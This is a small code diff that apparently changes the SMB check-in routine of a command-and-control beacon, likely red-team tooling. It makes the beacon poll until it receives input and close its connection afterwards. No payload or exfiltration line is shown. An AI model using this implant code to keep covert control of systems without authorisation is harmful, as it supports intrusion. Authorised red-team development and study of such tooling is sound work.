@@ -36,7 +36,11 @@ void BeaconSmb::checkIn()
 	if(res)
 	{
 		string input;
-		res=m_clientSmb->receiveData(input);
+		while(input.empty())
+		{
+			res=m_clientSmb->receiveData(input);
+			Sleep(50);
+		}
 		if(res)
 		{
 			DEBUG("received input.size " << std::to_string(input.size()));
@@ -47,9 +51,14 @@ void BeaconSmb::checkIn()
 			}
 		}
 		else
+		{
 			DEBUG("Receive failed");
+		}
 	}
 	else
-		DEBUG("Send failed");
+		DEBUG("Send failed");	
+
+
+	m_clientSmb->closeConnection();
 }
 
